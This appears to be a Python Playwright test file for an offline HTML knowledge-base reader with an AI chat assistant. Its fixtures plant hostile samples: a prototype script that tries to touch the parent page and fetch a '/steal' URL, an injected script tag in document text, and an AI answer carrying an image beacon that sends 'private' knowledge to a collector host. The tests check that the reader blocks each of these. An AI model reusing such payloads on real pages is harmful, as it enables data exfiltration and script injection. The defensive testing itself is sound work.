"""Single-file reader acceptance against file:// with isolated Chromium."""

import gzip
import json
import re
import struct
from base64 import b64decode, b64encode
from pathlib import Path

import pytest
from playwright.sync_api import expect, sync_playwright
from vks_api.readonly_export import html_library

from tests.ui.test_frontend_browser import chromium_path

ASSETS = Path(__file__).resolve().parents[2] / "services/api/vks_api/reader_assets"


@pytest.fixture
def reader_file(tmp_path):
    prototype = """<!doctype html><html><head><title>任务管理</title></head><body>
    <h1>任务管理</h1><button id="taskcreate" onclick="document.getElementById('modal').hidden=false">创建任务</button>
    <section id="modal" class="modal" hidden><h2>创建任务</h2><input placeholder="任务名称">
    <button onclick="document.getElementById('result').textContent='演示已提交'">提交</button><p id="result"></p></section>
    <script>try {parent.document.body.dataset.leaked='yes';window.leaked=true;} catch {window.leaked=false;}
    fetch('https://network.invalid/steal').catch(()=>{});</script></body></html>"""
    payload = {
        "schema_version": 1,
        "project": {"id": "test", "name": "离线产品知识库"},
        "snapshot": {"id": "v1", "name": "产品 V1"},
        "prototypes": [{"id": "p1", "name": "任务管理", "format": "html", "html": prototype, "targets": []}],
        "documents": [
            {
                "id": "d1",
                "title": "任务操作手册",
                "path": "任务操作手册.md",
                "sections": [
                    {
                        "id": "s1",
                        "title": "创建任务",
                        "content": "# 创建任务\n\n任务名称和负责人均为必填。\n\n1. 点击创建任务\n2. 输入任务名称\n3. 选择负责人\n\n<script>window.docExecuted=true</script>\n\n| 字段 | 必填 |\n| --- | --- |\n| 任务名称 | 是 |\n\n[其他文档](other.md#负责人设置)",
                    },
                ],
            },
            {
                "id": "d2",
                "title": "其他文档",
                "path": "other.md",
                "sections": [
                    {"id": "s2", "title": "负责人设置", "content": "# 负责人设置\n\n负责人从当前项目成员中选择。"}
                ],
            },
        ],
        "bindings": [
            {
                "id": "b1",
                "package_id": "p1",
                "scope": "control",
                "target": {
                    "route": "/",
                    "frame_path": [],
                    "selector": "#taskcreate",
                    "label": "创建任务",
                    "state": "",
                    "open_steps": [],
                },
                "summary": "新增任务需要填写名称和负责人。",
                "section_ids": ["s1"],
            }
        ],
        "rag": {
            "model": "text-embedding-3-small",
            "dimensions": 2,
            "chunks": [{"id": "c1", "section_id": "s1", "vector": b64encode(struct.pack("<ff", 1, 0)).decode()}],
        },
        "ai": {"model": "example-model"},
    }
    path = tmp_path / "library.html"
    path.write_bytes(html_library(payload))
    return path


def test_file_reader_offline_links_isolation_and_ephemeral_prototype(reader_file, tmp_path):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1280, "height": 900})
        requests = []
        page.on("request", lambda request: requests.append(request.url))
        try:
            page.goto(reader_file.as_uri())
            expect(page.get_by_role("button", name="知识文档", exact=True)).to_be_visible()
            frame = page.frame_locator("iframe.prototype-frame")
            expect(frame.get_by_role("button", name="创建任务", exact=True)).to_be_visible()
            assert page.locator("body").get_attribute("data-leaked") is None
            assert page.frames[1].evaluate("window.leaked") is False
            assert page.locator("iframe").get_attribute("sandbox") == "allow-scripts allow-same-origin allow-modals"
            assert page.locator("iframe").get_attribute("src").startswith("data:text/html;charset=utf-8;base64,")
            frame.get_by_role("button", name="创建任务", exact=True).click(button="right")
            page.get_by_role("button", name="查看关联文档", exact=False).click()
            expect(page.get_by_text("新增任务需要填写名称和负责人。", exact=True)).to_be_visible()
            page.locator(".knowledge-card .chat-citations summary").click()
            page.get_by_role("button", name="[1] 任务操作手册 · 创建任务", exact=True).click()
            preview = page.get_by_role("dialog", name="引用原文预览", exact=True)
            expect(preview).to_be_visible()
            preview.get_by_role("button", name="打开文档原文", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("任务操作手册")
            expect(page.locator(".document .section-links, .document .target-link")).to_have_count(0)
            expect(page.locator(".document table")).to_be_visible()
            assert page.evaluate("window.docExecuted") is None
            expect(page.get_by_text("<script>window.docExecuted=true</script>", exact=True)).to_be_visible()
            page.get_by_role("link", name="其他文档", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("其他文档")
            page.get_by_role("button", name="搜索文档", exact=True).click()
            page.get_by_role("textbox", name="搜索知识库", exact=True).fill("任务名称")
            page.locator(".search-result").first.click()
            expect(page.locator(".document h1")).to_have_text("任务操作手册")
            page.get_by_role("button", name="交互原型", exact=True).click()
            frame.get_by_role("button", name="创建任务", exact=True).click()
            frame.get_by_placeholder("任务名称").fill("只用于演示")
            frame.get_by_role("button", name="提交", exact=True).click()
            expect(frame.get_by_text("演示已提交", exact=True)).to_be_visible()
            page.get_by_role("button", name="知识文档", exact=True).click()
            page.get_by_role("button", name="交互原型", exact=True).click()
            expect(frame.get_by_placeholder("任务名称")).to_have_value("只用于演示")
            assert not [url for url in requests if url.startswith("http")]
            page.set_viewport_size({"width": 640, "height": 960})
            assert page.evaluate("document.documentElement.scrollWidth <= innerWidth")
            page.screenshot(path=tmp_path / "reader-mobile.png")
        finally:
            browser.close()


def configure(page):
    page.get_by_role("button", name="打开知识助手", exact=True).click()
    page.get_by_role("button", name="连接设置", exact=True).click()
    page.get_by_label("模型服务", exact=True).select_option("custom")
    page.get_by_label("接口地址", exact=True).fill("https://api.example.test/v1")
    page.get_by_label("API Key", exact=True).fill("fixture-recipient-only")
    page.get_by_role("button", name="获取模型", exact=True).click()
    page.get_by_label("可用模型", exact=True).select_option("fixture-chat")
    page.get_by_label("允许将我的问题和本知识库的相关章节发送到上述模型服务", exact=True).check()
    page.get_by_role("button", name="应用并开始提问", exact=True).click()


def test_recipient_model_dropdown_stream_citations_and_no_key_persistence(reader_file):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1280, "height": 900})
        calls = []

        def respond(route):
            request = route.request
            calls.append((request.url, request.method, request.post_data_json if request.post_data else None))
            headers = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*"}
            if request.method == "OPTIONS":
                route.fulfill(status=204, headers=headers)
            elif request.url.endswith("/models"):
                route.fulfill(json={"data": [{"id": "fixture-chat"}, {"id": "fixture-other"}]}, headers=headers)
            elif request.url.endswith("/chat/completions"):
                route.fulfill(
                    headers={**headers, "Content-Type": "text/event-stream"},
                    body='data: {"choices":[{"delta":{"content":"任务名称和负责人均为必填 [1]。"}}]}\n\ndata: {"choices":[{"delta":{},"finish_reason":"stop"}]}\n\ndata: [DONE]\n\n',
                )
            else:
                route.abort()

        page.route("https://api.example.test/v1/**", respond)
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_label("向 AI 提问", exact=True).fill("创建任务需要填写哪些信息？")
            question = page.get_by_label("向 AI 提问", exact=True)
            question.dispatch_event("keydown", {"key": "Enter", "isComposing": True, "keyCode": 229})
            question.press("Shift+Enter")
            assert question.input_value().endswith("\n")
            assert not [call for call in calls if call[0].endswith("/chat/completions")]
            question.press("Enter")
            expect(page.locator(".answer").last).to_contain_text("任务名称和负责人均为必填")
            expect(page.get_by_role("button", name="发送", exact=True)).to_be_enabled()
            user = page.locator(".chat-message.user").bounding_box()
            messages = page.locator(".chat-message-list").bounding_box()
            assert abs(user["x"] + user["width"] - messages["x"] - messages["width"]) < 3
            expect(page.locator(".chat-citations")).not_to_have_attribute("open", "")
            page.locator(".chat-citations summary").click()
            expect(page.locator(".chat-citations .rich-markdown")).to_have_count(0)
            expect(page.locator(".chat-citations .chat-source-entry").first).to_be_visible()
            page.locator(".chat-citations button").first.click()
            expect(page.get_by_role("dialog", name="引用原文预览", exact=True).locator("table")).to_be_visible()
            page.get_by_role("dialog", name="引用原文预览", exact=True).get_by_role(
                "button", name="打开文档原文", exact=True
            ).click()
            expect(page.locator(".document h1")).to_have_text("任务操作手册")
            assert len([call for call in calls if call[0].endswith("/chat/completions")]) == 1
            assert not page.evaluate(
                "Object.values(localStorage).some(value=>value.includes('fixture-recipient-only'))"
            )
            assert page.evaluate("sessionStorage.length") == 0
            assert "fixture-recipient-only" not in reader_file.read_text()
            page.reload()
            page.get_by_role("button", name="交互原型", exact=True).click()
            page.get_by_role("button", name="打开知识助手", exact=True).click()
            page.get_by_role("button", name="连接设置", exact=True).click()
            expect(page.get_by_label("API Key", exact=True)).to_have_value("")
        finally:
            browser.close()


def test_automatic_explanation_reports_response_stream_truncation(reader_file):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        calls = []

        def respond(route):
            request = route.request
            calls.append(request.url)
            headers = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*"}
            if request.method == "OPTIONS":
                route.fulfill(status=204, headers=headers)
            elif request.url.endswith("/models"):
                route.fulfill(json={"data": [{"id": "fixture-chat"}]}, headers=headers)
            else:
                route.fulfill(
                    headers={**headers, "Content-Type": "text/event-stream"},
                    body='data: {"type":"response.output_text.delta","delta":"部分回答"}\n\n',
                )

        page.route("https://api.example.test/v1/**", respond)
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_role("button", name="连接设置", exact=True).click()
            page.get_by_label("接口协议", exact=True).select_option("responses")
            page.get_by_label("自定义模型 ID", exact=True).fill("fixture-chat")
            page.get_by_role("button", name="应用并开始提问", exact=True).click()
            frame = page.frame_locator("iframe.prototype-frame")
            frame.get_by_role("button", name="创建任务", exact=True).click(button="right")
            page.get_by_role("button", name="AI 讲解这个功能", exact=False).click()
            expect(page.locator(".explanation-current .error")).to_have_text("连接提前结束，回答可能不完整，请重试。")
            expect(page.locator(".explanation-current .answer")).to_have_text("部分回答")
            assert len([call for call in calls if call.endswith("/responses")]) == 1
        finally:
            browser.close()


def rewrite_library(path, update):
    source = path.read_text()
    encoded = re.search(r'id="vks-payload"[^>]*>(.*?)</script>', source, re.DOTALL).group(1)
    payload = json.loads(gzip.decompress(b64decode(encoded)))
    update(payload)
    path.write_bytes(html_library(payload))


def test_nested_static_site_and_document_links_stay_in_material_namespace(reader_file):
    from vks_api.material_site import site_html

    def update(payload):
        payload["prototypes"][0]["html"] = site_html(
            "index.html",
            [
                (
                    "index.html",
                    '<!doctype html><meta charset=utf-8><title>任务管理</title><a id="next" href="help.html">查看说明</a>'.encode(),
                ),
                (
                    "help.html",
                    '<!doctype html><meta charset=utf-8><title>使用说明</title><h1>使用说明页面</h1><a href="index.html">返回任务</a>'.encode(),
                ),
            ],
        ).decode()
        for doc in payload["documents"]:
            doc["namespace"] = "package-A"
        payload["documents"].extend(
            [
                {
                    "id": "d3",
                    "namespace": "package-B",
                    "path": "任务操作手册.md",
                    "title": "B 操作手册",
                    "sections": [{"id": "s3", "title": "B 操作", "content": "# B 操作\n\n[其他文档](other.md)"}],
                },
                {
                    "id": "d4",
                    "namespace": "package-B",
                    "path": "other.md",
                    "title": "B 其他文档",
                    "sections": [{"id": "s4", "title": "B 负责人", "content": "# B 负责人\n\n这里是 B 包的说明。"}],
                },
            ]
        )

    rewrite_library(reader_file, update)
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        try:
            page.goto(reader_file.as_uri())
            frame = page.frame_locator("iframe.prototype-frame").frame_locator("#actualPage")
            frame.get_by_role("link", name="查看说明", exact=True).click()
            expect(frame.get_by_role("heading", name="使用说明页面", exact=True)).to_be_visible()
            frame.get_by_role("link", name="返回任务", exact=True).click()
            expect(frame.get_by_role("link", name="查看说明", exact=True)).to_be_visible()
            frame.locator("body").click(button="right", position={"x": 400, "y": 6})
            page.get_by_role("button", name="查看关联文档", exact=False).click()
            expect(page.locator(".assistant-context")).to_contain_text("当前模块")
            page.get_by_role("button", name="知识文档", exact=True).click()
            page.get_by_label("文档资料包", exact=True).select_option(label="文档资料包 2")
            page.locator(".doc-list").get_by_role("button", name="B 操作手册", exact=False).click()
            page.get_by_role("link", name="其他文档", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("B 其他文档")
        finally:
            browser.close()


@pytest.mark.parametrize("citation,expected_error", [("[1]", None), ("[99]", "回答包含无法核实的引用编号")])
def test_responses_fragmented_crlf_and_utf8_with_citation_validation(reader_file, citation, expected_error):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        text = "中文回答 " + citation
        stream = (
            "data: "
            + json.dumps({"type": "response.output_text.delta", "delta": text}, ensure_ascii=False)
            + "\r\n\r\n"
            + 'data: {"type":"response.completed","response":{"status":"completed"}}\r\n\r\n'
        )
        page.add_init_script(
            """stream => {
          const original = window.fetch;
          window.fetch = (url, init) => {
            if (String(url).endsWith('/responses')) {
              const raw = new TextEncoder().encode(stream);
              const firstCR = raw.indexOf(13), chinese = raw.findIndex(n=>n>127);
              const cuts = [chinese+1,firstCR+3,firstCR+4,raw.length];
              let start=0;
              return Promise.resolve(new Response(new ReadableStream({start(controller){
                for(const end of cuts){controller.enqueue(raw.slice(start,end));start=end;}
                controller.close();
              }}),{headers:{'Content-Type':'text/event-stream'}}));
            }
            return original(url,init);
          };
        }""".replace("stream => {", "(() => { const stream=" + json.dumps(stream) + ";")
            + ")();"
        )
        page.route(
            "https://api.example.test/v1/models",
            lambda route: route.fulfill(
                json={"data": [{"id": "fixture-chat"}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_role("button", name="连接设置", exact=True).click()
            page.get_by_label("接口协议", exact=True).select_option("responses")
            page.get_by_label("自定义模型 ID", exact=True).fill("fixture-chat")
            page.get_by_role("button", name="应用并开始提问", exact=True).click()
            page.get_by_label("向 AI 提问", exact=True).fill("创建任务的要求是什么？")
            page.get_by_role("button", name="发送", exact=True).click()
            expect(page.locator(".answer").last).to_contain_text("中文回答")
            expect(page.get_by_role("button", name="发送", exact=True)).to_be_visible()
            if expected_error:
                expect(page.locator(".chat-message .error")).to_contain_text(expected_error)
            else:
                expect(page.locator(".chat-message .error")).to_have_count(0)
        finally:
            browser.close()


def rich_document(reader_file):
    from io import BytesIO

    from PIL import Image
    from vks_api.documents import parse_sections

    image = BytesIO()
    Image.new("RGB", (180, 90), "#2d8a60").save(image, format="PNG")
    source = """# 任务操作手册

这里是原文导语，不能被章节切分丢弃。

## 基础规则

**中文加粗。**紧跟中文，*斜体*和~~删除线~~。

1. 填写任务名称
   - 嵌套列表保留**负责人**要求
   - [x] 已确认

| 字段 | 要求 |
| :--- | ---: |
| 名称 | **必填** |

[跨章节参考定义][guide]。注释[^note]。

![本地流程截图][picture]

<details><summary>展开原文说明</summary><p><b>HTML 加粗</b><br>保留换行。</p><img src="assets/flow.png" alt="HTML 本地图片"></details>

## 图表与公式

行内公式 $E=mc^2$。

$$
\\frac{1}{2}+\\frac{1}{2}=1
$$

```mermaid
flowchart LR
    A[填写任务名称] --> B{选择负责人}
    B --> C[保存任务]
```

```javascript
const requirement = "名称和负责人均为必填";
```

## 引用定义

[guide]: other.md#负责人设置
[picture]: assets/flow.png
[^note]: 脚注说明在全文末尾。
"""

    def update(payload):
        doc = payload["documents"][0]
        doc["markdown"] = source
        doc["images"] = {"assets/flow.png": "data:image/png;base64," + b64encode(image.getvalue()).decode()}
        doc["sections"] = [
            {
                "id": "s1" if index == 0 else f"s-extra-{index}",
                "title": row["title"],
                "content": row["content"],
                "start_line": row["startLine"],
                "end_line": row["endLine"],
                "heading_level": len(row["heading_path"]),
            }
            for index, row in enumerate(parse_sections(source, doc["title"]))
        ]

    rewrite_library(reader_file, update)


def test_rich_markdown_full_document_math_diagrams_images_and_reference_definitions(reader_file):
    rich_document(reader_file)
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1000})
        requests, errors = [], []
        page.on("request", lambda request: requests.append(request.url))
        page.on("pageerror", lambda error: errors.append(str(error)))
        try:
            page.goto(reader_file.as_uri())
            page.get_by_role("button", name="知识文档", exact=True).click()
            expect(page.get_by_text("这里是原文导语，不能被章节切分丢弃。", exact=True)).to_be_visible()
            expect(page.locator(".document strong").filter(has_text="中文加粗。")).to_have_count(1)
            expect(page.locator(".document em")).to_have_text("斜体")
            expect(page.locator(".document del")).to_have_text("删除线")
            expect(page.locator(".document ol ul")).to_have_count(1)
            expect(page.locator(".document input[type=checkbox]")).to_be_checked()
            expect(page.locator(".document table strong")).to_have_text("必填")
            expect(page.locator(".document img[alt='本地流程截图']")).to_be_visible()
            assert page.locator(".document img[alt='本地流程截图']").evaluate("image=>image.naturalWidth") == 180
            page.locator(".document img[alt='本地流程截图']").click()
            expect(page.get_by_role("dialog", name="本地流程截图", exact=True)).to_be_visible()
            page.get_by_role("button", name="关闭大图", exact=True).click()
            page.get_by_text("展开原文说明", exact=True).click()
            expect(page.locator(".document b")).to_have_text("HTML 加粗")
            expect(page.locator(".document img[alt='HTML 本地图片']")).to_be_visible()
            expect(page.locator(".document .math-inline .katex")).to_have_count(1)
            expect(page.locator(".document .math-display .katex")).to_have_count(1)
            expect(page.locator(".document .hljs-string")).not_to_have_count(0)
            diagram = page.locator(".document figure.md-diagram")
            diagram.scroll_into_view_if_needed()
            expect(diagram.locator("img[alt='Mermaid 图表']")).to_be_visible(timeout=20000)
            assert diagram.locator("img").evaluate("image=>image.naturalWidth") > 100
            diagram_svg = b64decode(diagram.locator("img").get_attribute("src").split(",", 1)[1]).decode()
            assert "填写任务名称" in diagram_svg and "选择负责人" in diagram_svg
            page.get_by_role("link", name="跨章节参考定义", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("其他文档")
            assert not [url for url in requests if url.startswith("http")]
            assert not errors
        finally:
            browser.close()


def test_ai_answer_uses_same_rich_renderer_and_cited_document_images(reader_file):
    rich_document(reader_file)
    answer = "**需要负责人。**紧跟中文 [1]。\n\n![回答中的流程图][picture]\n\n```mermaid\nflowchart LR\n A[任务名称] --> B[负责人]\n```"
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1000})

        def respond(route):
            headers = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*"}
            if route.request.url.endswith("/models"):
                route.fulfill(json={"data": [{"id": "fixture-chat"}]}, headers=headers)
            else:
                route.fulfill(json={"choices": [{"message": {"content": answer}}]}, headers=headers)

        page.route("https://api.example.test/v1/**", respond)
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_label("向 AI 提问", exact=True).fill("任务名称和负责人有什么要求？")
            page.get_by_role("button", name="发送", exact=True).click()
            response = page.locator(".answer").last
            expect(response.locator("strong")).to_have_text("需要负责人。")
            expect(response.locator("img[alt='回答中的流程图']")).to_be_visible()
            figure = response.locator("figure.md-diagram")
            figure.scroll_into_view_if_needed()
            expect(figure.locator("img[alt='Mermaid 图表']")).to_be_visible(timeout=20000)
            expect(response.locator("button.citation-inline")).to_have_text("[1]")
        finally:
            browser.close()


def test_ai_remote_images_must_be_exact_images_in_the_cited_original(reader_file):
    from io import BytesIO

    from PIL import Image

    allowed = "https://docs.example.test/allowed.png"
    forbidden = "https://collector.example.test/pixel?knowledge=private"
    image = BytesIO()
    Image.new("RGB", (80, 60), "green").save(image, format="PNG")

    def update(payload):
        payload["documents"][0]["sections"][0]["content"] += f"\n\n![原始参考图]({allowed})"

    rewrite_library(reader_file, update)
    answer = f"任务需要填写名称及负责人 [1]。\n\n![引用原图]({allowed})\n\n![未知回传图]({forbidden})"
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        requests = []
        page.on("request", lambda request: requests.append(request.url))
        page.route(allowed, lambda route: route.fulfill(body=image.getvalue(), content_type="image/png"))
        page.route(
            "https://api.example.test/v1/models",
            lambda route: route.fulfill(
                json={"data": [{"id": "fixture-chat"}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        page.route(
            "https://api.example.test/v1/chat/completions",
            lambda route: route.fulfill(
                json={"choices": [{"message": {"content": answer}}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_label("向 AI 提问", exact=True).fill("创建任务需要哪些信息？")
            page.get_by_role("button", name="发送", exact=True).click()
            response = page.locator(".answer").last
            expect(response.locator("img[alt='引用原图']")).to_be_visible()
            expect(response.get_by_text("未知回传图（图片未包含在当前资料中）", exact=True)).to_be_visible()
            assert not [url for url in requests if "collector.example.test" in url]
            assert allowed in requests
        finally:
            browser.close()


def test_finished_ai_graph_is_reused_while_next_stream_defers_new_diagrams(reader_file):
    first = "创建任务需要名称和负责人 [1]。\n\n```mermaid\nflowchart LR\n A[原有图表] --> B[保持显示]\n```"
    second = "后续回答 [1]。\n\n```mermaid\nflowchart LR\n A[新图表] --> B[结束后绘制]\n```"
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1000})
        page.add_init_script(
            """(() => {
          const original=window.fetch;let calls=0;
          window.fetch=(url,init)=>{
            if(!String(url).endsWith('/chat/completions')) return original(url,init);
            calls++;
            if(calls===1)return Promise.resolve(Response.json({choices:[{message:{content:FIRST}}]}));
            return Promise.resolve(new Response(new ReadableStream({start(controller){
              window.qaPush=content=>controller.enqueue(new TextEncoder().encode('data: '+JSON.stringify({choices:[{delta:{content}}]})+'\\n\\n'));
              window.qaFinish=()=>{controller.enqueue(new TextEncoder().encode('data: {"choices":[{"delta":{},"finish_reason":"stop"}]}\\n\\ndata: [DONE]\\n\\n'));controller.close()};
            }}),{headers:{'Content-Type':'text/event-stream'}}));
          };
        })()""".replace("FIRST", json.dumps(first, ensure_ascii=False))
        )
        page.route(
            "https://api.example.test/v1/models",
            lambda route: route.fulfill(
                json={"data": [{"id": "fixture-chat"}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_label("向 AI 提问", exact=True).fill("创建任务有什么要求？")
            page.get_by_role("button", name="发送", exact=True).click()
            original = page.locator(".chat-message.assistant-message figure img").first
            expect(original).to_be_visible(timeout=20000)
            page.evaluate("window.qaOriginalGraph=document.querySelector('.chat-message.assistant-message figure img')")
            page.get_by_label("向 AI 提问", exact=True).fill("再解释创建任务的要求")
            page.get_by_role("button", name="发送", exact=True).click()
            page.wait_for_function("typeof window.qaPush==='function'")
            page.evaluate("content=>window.qaPush(content)", second)
            expect(page.locator(".md-diagram-deferred")).to_have_count(1)
            assert page.evaluate(
                "window.qaOriginalGraph===document.querySelector('.chat-message.assistant-message figure img')&&window.qaOriginalGraph.isConnected"
            )
            expect(page.locator("iframe[title='本地图表渲染器']")).to_have_count(0)
            page.evaluate("window.qaFinish()")
            expect(page.locator(".chat-message.assistant-message figure img")).to_have_count(2, timeout=20000)
            assert page.evaluate(
                "window.qaOriginalGraph===document.querySelector('.chat-message.assistant-message figure img')&&window.qaOriginalGraph.isConnected"
            )
        finally:
            browser.close()


def directory_library(reader_file):
    from vks_api.documents import parse_sections

    source = "# 任务操作手册\n\n## 创建任务\n\n任务名称和负责人均为必填。\n\n### 填写信息\n\n输入任务信息后保存。\n\n## 删除任务\n\n[跨分类入口](../概览/other.md#负责人设置)"

    def update(payload):
        first, other = payload["documents"]
        first.update(namespace="package-A", path="操作/manual.md", markdown=source)
        first["sections"] = [
            {
                "id": "s1"
                if row["title"] == "创建任务"
                else "s-info"
                if row["title"] == "填写信息"
                else "s-delete"
                if row["title"] == "删除任务"
                else "s-title",
                "title": row["title"],
                "content": row["content"],
                "start_line": row["startLine"],
                "heading_level": len(row["heading_path"]),
            }
            for row in parse_sections(source, first["title"])
        ]
        other.update(namespace="package-A", path="概览/other.md")
        payload["documents"].extend(
            [
                {
                    "id": "d3",
                    "namespace": "package-A",
                    "path": "操作/first.md",
                    "title": "Z 原始排序第一篇",
                    "sections": [{"id": "s3", "title": "开始阅读", "content": "# 开始阅读\n\n按照资料中的顺序阅读。"}],
                },
                {
                    "id": "d4",
                    "namespace": "package-A",
                    "path": "操作/进阶/deep.md",
                    "title": "进阶操作说明",
                    "sections": [{"id": "s4", "title": "高级操作", "content": "# 高级操作\n\n进阶目录中的说明。"}],
                },
                {
                    "id": "db",
                    "namespace": "package-B",
                    "path": "操作/manual.md",
                    "title": "B 独立手册",
                    "sections": [
                        {"id": "sb", "title": "B 专属说明", "content": "# B 专属说明\n\n独立资料包的专属负责人规则。"}
                    ],
                },
            ]
        )

        def leaf(id):
            doc = next(doc for doc in payload["documents"] if doc["id"] == id)
            return {"kind": "document", "id": id, "name": doc["title"], "path": doc["path"]}

        payload["navigation"] = {
            "packages": [
                {
                    "id": "package-A",
                    "name": "第一份项目手册",
                    "categories": [
                        {"id": "a-overview", "name": "项目概览", "path": "概览", "children": [leaf("d2")]},
                        {
                            "id": "a-guide",
                            "name": "操作指南",
                            "path": "操作",
                            "children": [
                                leaf("d3"),
                                leaf("d1"),
                                {
                                    "kind": "folder",
                                    "id": "a-deep",
                                    "name": "进阶",
                                    "path": "操作/进阶",
                                    "children": [leaf("d4")],
                                },
                            ],
                        },
                    ],
                },
                {
                    "id": "package-B",
                    "name": "第二份独立手册",
                    "categories": [
                        {"id": "b-guide", "name": "B 使用指南", "path": "操作", "children": [leaf("db")]},
                    ],
                },
            ]
        }

    rewrite_library(reader_file, update)


def test_export_directory_tabs_source_order_folders_chapters_and_cross_category_links(reader_file):
    directory_library(reader_file)
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1050})
        try:
            page.goto(reader_file.as_uri())
            page.get_by_role("button", name="知识文档", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("其他文档")
            assert page.get_by_role("tablist", name="文档分类").get_by_role("tab").all_text_contents() == [
                "项目概览",
                "操作指南",
            ]
            page.get_by_role("tab", name="操作指南", exact=True).click()
            assert page.locator(".doc-list .document-link").all_text_contents() == [
                "01Z 原始排序第一篇",
                "02任务操作手册",
            ]
            page.locator(".doc-list").get_by_role("button", name="进阶", exact=True).click()
            expect(page.locator(".doc-list").get_by_role("button", name="进阶操作说明", exact=True)).to_be_visible()
            page.locator(".doc-list").get_by_role("button", name="任务操作手册", exact=True).click()
            expect(page.locator(".document h1")).to_have_text("任务操作手册")
            expect(page.locator(".doc-list .chapter-link").filter(has_text="创建任务")).to_have_count(0)
            task_row = page.locator(".doc-row").filter(has=page.get_by_role("button", name="任务操作手册", exact=True))
            task_row.get_by_role("button", name="展开文章章节", exact=True).click()
            expect(page.locator(".doc-list .chapter-link").filter(has_text="创建任务")).to_be_visible()
            page.locator(".doc-list").get_by_role("button", name="Z 原始排序第一篇", exact=True).click()
            page.locator(".doc-list").get_by_role("button", name="任务操作手册", exact=True).click()
            expect(task_row.get_by_role("button", name="收起文章章节", exact=True)).to_have_attribute(
                "aria-expanded", "true"
            )
            page.locator(".doc-list").get_by_role("button", name="展开子章节", exact=True).click()
            page.locator(".doc-list").get_by_role("button", name="填写信息", exact=True).click()
            expect(page.locator(".document #section-s-info")).to_contain_text("输入任务信息后保存")
            expect(page.locator(".chapter-link[aria-current='location']")).to_have_text("填写信息")
            page.get_by_role("link", name="跨分类入口", exact=True).click()
            expect(page.get_by_role("tab", name="项目概览", exact=True)).to_have_attribute("aria-selected", "true")
            expect(page.locator(".document h1")).to_have_text("其他文档")
            expect(page.locator(".document-breadcrumb")).to_contain_text("项目概览")
            page.get_by_role("tab", name="操作指南", exact=True).click()
            page.locator(".doc-list").get_by_role("button", name="进阶操作说明", exact=True).click()
            expect(page.locator(".document-breadcrumb")).to_contain_text("进阶")
            page.get_by_role("button", name="搜索文档", exact=True).click()
            page.get_by_role("textbox", name="搜索知识库", exact=True).fill("负责人从当前项目成员中选择")
            page.locator(".search-result").first.click()
            expect(page.get_by_role("tab", name="项目概览", exact=True)).to_have_attribute("aria-selected", "true")
            page.set_viewport_size({"width": 640, "height": 960})
            assert page.evaluate("document.documentElement.scrollWidth <= innerWidth")
        finally:
            browser.close()


def test_export_citation_follows_its_package_and_category_without_edit_controls(reader_file):
    directory_library(reader_file)
    rewrite_library(reader_file, lambda payload: payload["bindings"][0].update(section_ids=["sb"]))
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        try:
            page.goto(reader_file.as_uri())
            page.frame_locator(".prototype-frame").get_by_role("button", name="创建任务", exact=True).click(
                button="right"
            )
            page.get_by_role("button", name="查看关联文档", exact=False).click()
            page.locator(".knowledge-card .chat-citations summary").click()
            page.get_by_role("button", name="[1] B 独立手册 · B 专属说明", exact=True).click()
            page.get_by_role("dialog", name="引用原文预览", exact=True).get_by_role("button", name="打开文档原文", exact=True).click()
            expect(page.get_by_label("文档资料包", exact=True)).to_have_value("package-B")
            expect(page.get_by_role("tab", name="B 使用指南", exact=True)).to_have_attribute("aria-selected", "true")
            expect(page.locator(".document h1")).to_have_text("B 独立手册")
            expect(page.get_by_role("button", name="编辑", exact=True)).to_have_count(0)
            expect(page.get_by_role("button", name="导入", exact=True)).to_have_count(0)
        finally:
            browser.close()


def test_legacy_directory_fallback_keeps_path_array_order_and_ignores_stale_version_leaves(reader_file):
    def update(payload):
        payload["documents"][0]["path"] = "02_操作/z.md"
        payload["documents"][1]["path"] = "01_概览/a.md"

    rewrite_library(reader_file, update)
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page()
        try:
            page.goto(reader_file.as_uri())
            page.get_by_role("button", name="知识文档", exact=True).click()
